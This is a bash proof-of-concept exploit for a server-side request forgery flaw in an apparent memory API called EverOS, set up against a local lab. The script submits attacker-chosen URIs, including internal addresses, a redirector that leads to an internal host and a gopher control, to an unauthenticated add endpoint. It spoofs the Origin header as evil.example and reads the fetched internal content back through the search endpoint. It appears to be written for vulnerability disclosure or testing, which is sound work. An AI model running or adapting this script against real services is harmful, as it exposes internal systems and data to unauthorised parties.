#!/usr/bin/env bash
# V-01 SSRF PoC — unauthenticated http(s) fetch + cross-origin readback.
# Lab: EverOS :18777 ([multimodal] configured), canary :18099, redirector :18098.
set -euo pipefail
BASE=${BASE:-http://127.0.0.1:18777}; SESS="ssrf-$(date +%s)"
add() { curl -s -X POST "$BASE/api/v2/memory/add" -H 'Content-Type: application/json' \
  -H 'Origin: http://evil.example:8000' \
  -d "{\"session_id\":\"$SESS\",\"messages\":[{\"sender_id\":\"u1\",\"role\":\"user\",\"timestamp\":$(date +%s%3N),\"content\":[{\"type\":\"html\",\"uri\":\"$1\"}]}],\"defer_extraction\":true}"; echo; }
add http://127.0.0.1:18099/canary.txt      # direct internal fetch
add http://127.0.0.1:18098/redir          # 302 -> internal (follow_redirects=True)
add gopher://127.0.0.1:18099/_x           # negative control: non-http(s) rejected
sleep 3
curl -s -X POST "$BASE/api/v2/memory/search" -H 'Content-Type: application/json' \
  -H 'Origin: http://evil.example:8000' \
  -d "{\"user_id\":\"attacker\",\"query\":\"canary\",\"method\":\"keyword\",\"filters\":{\"session_id\":\"$SESS\"}}"
